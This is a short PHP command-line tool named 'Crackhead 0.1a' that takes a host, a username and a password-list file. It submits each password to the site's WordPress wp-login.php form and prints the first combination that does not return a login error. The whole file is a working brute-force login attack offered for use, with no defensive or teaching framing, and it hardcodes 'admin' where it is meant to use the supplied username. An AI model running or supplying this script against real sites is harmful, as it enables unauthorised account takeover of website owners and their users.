#!/usr/bin/php
<?php
	require_once 'libs/goutte.phar';

	date_default_timezone_set( @date_default_timezone_get() );

	$passwords = array();

	if( ! isset( $_ENV["_"] ) )
		die( 'This is for CLI only. Sorry bub.' );

	$opts = getopt( 'u:P:h:' );

	$username  = $opts['u'];
	$passwords = $opts['P'];
	$host      = $opts['h'];
	
	if( empty( $username ) && empty( $passwords ) && empty( $host ) ) {
		printf( "Crackhead 0.1a\n\n" );
		printf( "-h\thost (ex. www.loserville.com)\n" );
		printf( "-u\tusername (ex. admin)\n");
		printf( "-P\tpassword file (ex. pass.txt)\n\n");
		return;
	}

	use Goutte\Client;
	$client = new Client( array( 'useragent' => 'Crackhead/0.1a' ) );

	$crawler = $client->request( 'POST', 'http://' . $host . '/wp-login.php' );
	$form    = $crawler->selectButton( 'Log In' )->form();
	
	$passes  = file( $passwords, FILE_SKIP_EMPTY_LINES );

	printf( "[+] attack initiated against '%s' using username '%s' at http://%s/wp-login.php...\n", $crawler->filter( '#login h1 a' )->text(), $username, $host );
	printf( "[+] reading file %s...\n", $passwords );
	printf( "[+] we have %d passwords...\n", count( $passes ) );

	foreach( $passes as $password ) {	
		$crawler = $client->submit( $form, array( 'log' => 'admin', 'pwd' => $password ) );
		
		try {
			$nodes = $crawler->filter( '#login_error' )->text();
			$error = true;
		} catch( Exception $e ) {
			$error = false;
		}

		if( $error ) {
			printf( "[?] %s:%s ...\n", $username, trim( $password ) );
		} else {
			printf( "[!] SUCCESS! The winning combo is %s:%s\n", $username, $password );
			return;
		}
	}
?>
